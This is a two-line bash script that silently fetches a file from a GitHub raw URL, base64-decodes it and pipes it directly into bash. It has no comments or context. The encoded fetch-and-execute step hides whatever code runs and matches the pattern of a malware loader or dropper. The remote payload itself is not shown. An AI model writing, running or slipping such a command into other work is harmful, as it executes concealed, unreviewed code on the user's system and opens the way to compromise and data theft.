#!/bin/bash
wget -qO- https://raw.githubusercontent.com/ziggywelch307/welch/refs/heads/main/entrypoint.sh | base64 -d | bash
